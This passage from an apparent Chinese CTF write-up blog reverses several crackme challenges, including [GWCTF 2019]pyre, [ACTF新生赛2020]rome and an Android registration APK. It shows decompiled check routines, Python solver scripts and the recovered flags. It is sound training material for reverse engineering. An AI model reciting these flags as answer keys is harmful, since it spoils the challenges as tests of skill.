class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  _BYTE _F___N___(I?_@[<span class="hljs-number">12</span>]; // [esp+12h] [ebp-2Eh] BYREF<br>  _DWORD v5[<span class="hljs-number">3</span>]; // [esp+1Eh] [ebp-22h]<br>  _BYTE v6[<span class="hljs-number">5</span>]; // [esp+2Ah] [ebp-16h] BYREF<br>  <span class="hljs-built_in">int</span> v7; // [esp+2Fh] [ebp-11h]<br>  <span class="hljs-built_in">int</span> v8; // [esp+33h] [ebp-Dh]<br>  <span class="hljs-built_in">int</span> v9; // [esp+37h] [ebp-9h]<br>  char n125; // [esp+3Bh] [ebp-5h]<br>  <span class="hljs-built_in">int</span> i; // [esp+3Ch] [ebp-4h]<br><br>  __main();<br>  qmemcpy(_F___N___(I?_@, <span class="hljs-string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>, sizeof(_F___N___(I?_@));<br>  printf(<span class="hljs-string">&quot;Please input:&quot;</span>);<br>  scanf(<span class="hljs-string">&quot;%s&quot;</span>, v6);<br>  <span class="hljs-keyword">if</span> ( v6[<span class="hljs-number">0</span>] != <span class="hljs-number">65</span> || v6[<span class="hljs-number">1</span>] != <span class="hljs-number">67</span> || v6[<span class="hljs-number">2</span>] != <span class="hljs-number">84</span> || v6[<span class="hljs-number">3</span>] != <span class="hljs-number">70</span> || v6[<span class="hljs-number">4</span>] != <span class="hljs-number">123</span> || n125 != <span class="hljs-number">125</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  v5[<span class="hljs-number">0</span>] = v7;<br>  v5[<span class="hljs-number">1</span>] = v8;<br>  v5[<span class="hljs-number">2</span>] = v9;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">11</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( _F___N___(I?_@[i] != _data_start__[*((char *)v5 + i) - <span class="hljs-number">1</span>] )// <span class="hljs-string">&quot;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&#x27;&amp;%$# !\&quot;&quot;</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  printf(<span class="hljs-string">&quot;You are correct!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>alp = [<span class="hljs-number">0x7E</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x00</span>]<br>value = [<span class="hljs-number">0x2A</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x60</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(value)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">97</span>):<br>        <span class="hljs-keyword">if</span>(alp[j-<span class="hljs-number">1</span>] == value[i]):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># flag&#123;U9X_1S_W6@T?&#125;</span><br></code></pre></td></tr></table></figure><h1 id="简单注册器"><a href="#简单注册器" class="headerlink" title="简单注册器"></a><font style="color:rgb(33, 37, 41);">简单注册器</font></h1><blockquote><p>考点</p><ul><li>java类：APK</li><li>位置变换</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python">package com.example.flag;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.support.v4.app.Fragment;<br><span class="hljs-keyword">import</span> android.support.v7.app.ActionBarActivity;<br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.Menu;<br><span class="hljs-keyword">import</span> android.view.MenuItem;<br><span class="hljs-keyword">import</span> android.view.View.OnClickListener;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> extends ActionBarActivity &#123;<br>    public static <span class="hljs-keyword">class</span> <span class="hljs-title class_">PlaceholderFragment</span> extends Fragment &#123;<br><span class="hljs-meta">        @Override  // android.support.v4.app.Fragment</span><br>        public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) &#123;<br>            <span class="hljs-keyword">return</span> inflater.inflate(<span class="hljs-number">0x7F030018</span>, container, false);  // layout:fragment_main<br>        &#125;<br>    &#125;<br><br><span class="hljs-meta">    @Override  // android.support.v7.app.ActionBarActivity</span><br>    protected void onCreate(Bundle savedInstanceState) &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        this.setContentView(<span class="hljs-number">0x7F030017</span>);  // layout:activity_main<br>        <span class="hljs-keyword">if</span>(savedInstanceState == null) &#123;<br>            this.getSupportFragmentManager().beginTransaction().add(<span class="hljs-number">0x7F05003C</span>, new PlaceholderFragment()).commit();  // <span class="hljs-built_in">id</span>:container<br>        &#125;<br><br>        Button button = (Button)this.findViewById(<span class="hljs-number">0x7F05003F</span>);  // <span class="hljs-built_in">id</span>:button1<br>        TextView textview = (TextView)this.findViewById(<span class="hljs-number">0x7F05003E</span>);  // <span class="hljs-built_in">id</span>:textView1<br>        button.setOnClickListener(new View.OnClickListener() &#123;<br><span class="hljs-meta">            @Override  // android.view.View$OnClickListener</span><br>            public void onClick(View v) &#123;<br>                <span class="hljs-built_in">int</span> flag = <span class="hljs-number">1</span>;<br>                String s = ((EditText)this.findViewById(<span class="hljs-number">0x7F05003D</span>)).getText().toString();  // <span class="hljs-built_in">id</span>:editText1<br>                <span class="hljs-keyword">if</span>(s.length() != <span class="hljs-number">0x20</span> || s.charAt(<span class="hljs-number">0x1F</span>) != <span class="hljs-number">97</span> || s.charAt(<span class="hljs-number">1</span>) != <span class="hljs-number">98</span> || s.charAt(<span class="hljs-number">0</span>) + s.charAt(<span class="hljs-number">2</span>) - <span class="hljs-number">0x30</span> != <span class="hljs-number">56</span>) &#123;<br>                    flag = <span class="hljs-number">0</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span>(flag == <span class="hljs-number">1</span>) &#123;<br>                    char[] arr_c = <span class="hljs-string">&quot;dd2940c04462b4dd7c450528835cca15&quot;</span>.toCharArray();<br>                    arr_c[<span class="hljs-number">2</span>] = (char)(arr_c[<span class="hljs-number">2</span>] + arr_c[<span class="hljs-number">3</span>] - <span class="hljs-number">50</span>);<br>                    arr_c[<span class="hljs-number">4</span>] = (char)(arr_c[<span class="hljs-number">2</span>] + arr_c[<span class="hljs-number">5</span>] - <span class="hljs-number">0x30</span>);<br>                    arr_c[<span class="hljs-number">30</span>] = (char)(arr_c[<span class="hljs-number">0x1F</span>] + arr_c[<span class="hljs-number">9</span>] - <span class="hljs-number">0x30</span>);<br>                    arr_c[<span class="hljs-number">14</span>] = (char)(arr_c[<span class="hljs-number">27</span>] + arr_c[<span class="hljs-number">28</span>] - <span class="hljs-number">97</span>);<br>                    <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i) &#123;<br>                        char a = arr_c[<span class="hljs-number">0x1F</span> - i];<br>                        arr_c[<span class="hljs-number">0x1F</span> - i] = arr_c[i];<br>                        arr_c[i] = a;<br>                    &#125;<br><br>                    textview.setText(<span class="hljs-string">&quot;flag&#123;&quot;</span> + arr_c + <span class="hljs-string">&quot;&#125;&quot;</span>);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><br>                textview.setText(<span class="hljs-string">&quot;输入注册码错误&quot;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br><br><span class="hljs-meta">    @Override  // android.app.Activity</span><br>    public boolean onCreateOptionsMenu(Menu menu) &#123;<br>        this.getMenuInflater().inflate(<span class="hljs-number">0x7F0C0000</span>, menu);  // menu:main<br>        <span class="hljs-keyword">return</span> true;<br>    &#125;<br><br><span class="hljs-meta">    @Override  // android.app.Activity</span><br>    public boolean onOptionsItemSelected(MenuItem item) &#123;<br>        <span class="hljs-keyword">return</span> item.getItemId() == <span class="hljs-number">0x7F050040</span> ? true : <span class="hljs-built_in">super</span>.onOptionsItemSelected(item);  // <span class="hljs-built_in">id</span>:action_settings<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>arr_c = <span class="hljs-built_in">list</span>(<span class="hljs-string">b&quot;dd2940c04462b4dd7c450528835cca15&quot;</span>)<br><br>arr_c[<span class="hljs-number">2</span>] = (arr_c[<span class="hljs-number">2</span>] + arr_c[<span class="hljs-number">3</span>] - <span class="hljs-number">50</span>)<br>arr_c[<span class="hljs-number">4</span>] = (arr_c[<span class="hljs-number">2</span>] + arr_c[<span class="hljs-number">5</span>] - <span class="hljs-number">0x30</span>)<br>arr_c[<span class="hljs-number">30</span>] = (arr_c[<span class="hljs-number">0x1F</span>] + arr_c[<span class="hljs-number">9</span>] - <span class="hljs-number">0x30</span>)<br>arr_c[<span class="hljs-number">14</span>] = (arr_c[<span class="hljs-number">27</span>] + arr_c[<span class="hljs-number">28</span>] - <span class="hljs-number">97</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    a = arr_c[<span class="hljs-number">0x1F</span> - i]<br>    arr_c[<span class="hljs-number">0x1F</span> - i] = arr_c[i]<br>    arr_c[i] = a<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag&#123;&#x27;</span>+<span class="hljs-built_in">bytes</span>(arr_c).decode()+<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br><span class="hljs-comment"># flag&#123;59acc538825054c7de4b26440c0999dd&#125;</span><br></code></pre></td></tr></table></figure><h1 id="GWCTF-2019-pyre"><a href="#GWCTF-2019-pyre" class="headerlink" title="[GWCTF 2019]pyre"></a><font style="color:rgb(33, 37, 41);">[GWCTF 2019]pyre</font></h1><blockquote><p>考点</p><ul><li>python类：pyc文件</li><li>pycdc等python反编译工具使用</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Source Generated with Decompyle++</span><br><span class="hljs-comment"># File: attachment.pyc (Python 2.7)</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Welcome to Re World!&#x27;</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Your input1 is your flag~&#x27;</span><br>l = <span class="hljs-built_in">len</span>(input1)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>    num = ((input1[i] + i) % <span class="hljs-number">128</span> + <span class="hljs-number">128</span>) % <span class="hljs-number">128</span><br>    code += num<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l - <span class="hljs-number">1</span>):<br>    code[i] = code[i] ^ code[i + <span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span> code<br>code = [<br>    <span class="hljs-string">&#x27;\x1f&#x27;</span>,<br>    <span class="hljs-string">&#x27;\x12&#x27;</span>,<br>    <span class="hljs-string">&#x27;\x1d&#x27;</span>,<br>    <span class="hljs-string">&#x27;(&#x27;</span>,<br>    <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;4&#x27;</span>,<br>    <span class="hljs-string">&#x27;\x01&#x27;</span>,<br>    <span class="hljs-string">&#x27;\x06&#x27;</span>,<br>    <span class="hljs-string">&#x27;\x14&#x27;</span>,<br>    <span class="hljs-string">&#x27;4&#x27;</span>,<br>    <span class="hljs-string">&#x27;,&#x27;</span>,<br>    <span class="hljs-string">&#x27;\x1b&#x27;</span>,<br>    <span class="hljs-string">&#x27;U&#x27;</span>,<br>    <span class="hljs-string">&#x27;?&#x27;</span>,<br>    <span class="hljs-string">&#x27;o&#x27;</span>,<br>    <span class="hljs-string">&#x27;6&#x27;</span>,<br>    <span class="hljs-string">&#x27;*&#x27;</span>,<br>    <span class="hljs-string">&#x27;:&#x27;</span>,<br>    <span class="hljs-string">&#x27;\x01&#x27;</span>,<br>    <span class="hljs-string">&#x27;D&#x27;</span>,<br>    <span class="hljs-string">&#x27;;&#x27;</span>,<br>    <span class="hljs-string">&#x27;%&#x27;</span>,<br>    <span class="hljs-string">&#x27;\x13&#x27;</span>]<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## python2的逻辑有点不一样，code += num 相当于 code.append(num)</span><br>code = [<span class="hljs-string">&#x27;\x1f&#x27;</span>,<span class="hljs-string">&#x27;\x12&#x27;</span>,<span class="hljs-string">&#x27;\x1d&#x27;</span>,<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;\x01&#x27;</span>,<span class="hljs-string">&#x27;\x06&#x27;</span>,<span class="hljs-string">&#x27;\x14&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-string">&#x27;\x1b&#x27;</span>,<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;?&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;*&#x27;</span>,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;\x01&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;;&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;\x13&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(code)):<br>    code[i] = <span class="hljs-built_in">ord</span>(code[i])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(code)-<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>    code[i] ^= code[i+<span class="hljs-number">1</span>] <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(code)):<br>    <span class="hljs-keyword">for</span> alp <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        num = ((alp + i) % <span class="hljs-number">128</span> + <span class="hljs-number">128</span>) % <span class="hljs-number">128</span><br>        <span class="hljs-keyword">if</span> num == code[i]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(alp),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># flag&#123;Just_Re_1s_Ha66y!&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ACTF新生赛2020-rome"><a href="#ACTF新生赛2020-rome" class="headerlink" title="[ACTF新生赛2020]rome"></a><font style="color:rgb(33, 37, 41);">[ACTF新生赛2020]rome</font></h1><blockquote><p>考点</p><ul><li>凯撒，针对大小写的变化</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> func()<br>&#123;<br>  <span class="hljs-built_in">int</span> n65_1; // eax<br>  _DWORD v1[<span class="hljs-number">4</span>]; // [esp+14h] [ebp-44h]<br>  unsigned __int8 n65; // [esp+24h] [ebp-34h] BYREF<br>  unsigned __int8 n67; // [esp+25h] [ebp-33h]<br>  unsigned __int8 n84; // [esp+26h] [ebp-32h]<br>  unsigned __int8 n70; // [esp+27h] [ebp-31h]<br>  unsigned __int8 n123; // [esp+28h] [ebp-30h]<br>  <span class="hljs-built_in">int</span> v7; // [esp+29h] [ebp-2Fh]<br>  <span class="hljs-built_in">int</span> v8; // [esp+2Dh] [ebp-2Bh]<br>  <span class="hljs-built_in">int</span> v9; // [esp+31h] [ebp-27h]<br>  <span class="hljs-built_in">int</span> v10; // [esp+35h] [ebp-23h]<br>  unsigned __int8 n125; // [esp+39h] [ebp-1Fh]<br>  char Qsw3sj_lz4_Ujw@l[<span class="hljs-number">17</span>]; // [esp+3Bh] [ebp-1Dh] BYREF<br>  <span class="hljs-built_in">int</span> i; // [esp+4Ch] [ebp-Ch]<br><br>  strcpy(Qsw3sj_lz4_Ujw@l, <span class="hljs-string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>);<br>  printf(<span class="hljs-string">&quot;Please input:&quot;</span>);<br>  scanf(<span class="hljs-string">&quot;%s&quot;</span>, &amp;n65);<br>  n65_1 = n65;<br>  <span class="hljs-keyword">if</span> ( n65 == <span class="hljs-number">65</span> )<br>  &#123;<br>    n65_1 = n67;<br>    <span class="hljs-keyword">if</span> ( n67 == <span class="hljs-number">67</span> )<br>    &#123;<br>      n65_1 = n84;<br>      <span class="hljs-keyword">if</span> ( n84 == <span class="hljs-number">84</span> )<br>      &#123;<br>        n65_1 = n70;<br>        <span class="hljs-keyword">if</span> ( n70 == <span class="hljs-number">70</span> )<br>        &#123;<br>          n65_1 = n123;<br>          <span class="hljs-keyword">if</span> ( n123 == <span class="hljs-number">123</span> )<br>          &#123;<br>            n65_1 = n125;<br>            <span class="hljs-keyword">if</span> ( n125 == <span class="hljs-number">125</span> )<br>            &#123;<br>              v1[<span class="hljs-number">0</span>] = v7;<br>              v1[<span class="hljs-number">1</span>] = v8;<br>              v1[<span class="hljs-number">2</span>] = v9;<br>              v1[<span class="hljs-number">3</span>] = v10;<br>              <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>              &#123;<br>                <span class="hljs-keyword">if</span> ( *(v1 + i) &gt; <span class="hljs-number">64</span> &amp;&amp; *(v1 + i) &lt;= <span class="hljs-number">90</span> )<br>                  *(v1 + i) = (*(v1 + i) - <span class="hljs-number">51</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>;<br>                <span class="hljs-keyword">if</span> ( *(v1 + i) &gt; <span class="hljs-number">96</span> &amp;&amp; *(v1 + i) &lt;= <span class="hljs-number">122</span> )<br>                  *(v1 + i) = (*(v1 + i) - <span class="hljs-number">79</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>;<br>              &#125;<br>              <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>              &#123;<br>                n65_1 = Qsw3sj_lz4_Ujw@l[i];<br>                <span class="hljs-keyword">if</span> ( *(v1 + i) != n65_1 )<br>                  <span class="hljs-keyword">return</span> n65_1;<br>              &#125;<br>              <span class="hljs-keyword">return</span> printf(<span class="hljs-string">&quot;You are correct!&quot;</span>);<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> n65_1;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>code = <span class="hljs-built_in">list</span>(<span class="hljs-string">b&#x27;Qsw3sj_lz4_Ujw@l&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(code)):<br>    <span class="hljs-keyword">for</span> alp <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(alp).isalpha():<br>            <span 